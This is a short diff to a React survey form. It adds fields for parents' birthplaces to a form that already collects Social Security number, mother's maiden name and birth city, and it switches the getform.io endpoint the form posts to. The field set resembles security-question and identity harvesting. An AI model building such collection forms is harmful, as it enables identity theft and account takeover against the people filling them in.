@@ -10,6 +10,8 @@ const initialState = {
   Gender: "",
   PhoneNumber: "",
   WhatCityWereYouBorn: "",
+  FatherPlaceOfBirth: "",
+  MotherPlaceOfBirth: "",
   SocialSecurityNumber: "",
   MotherFullName: "",
   MotherMaidenName: "",
@@ -50,7 +52,7 @@ export default function SurveyForm() {
     const formData = new FormData(form);
 
     try {
-      const response = await fetch("https://getform.io/f/bxownyja", {
+      const response = await fetch("https://getform.io/f/broymjda", {
         method: "POST",
         body: formData,
       });
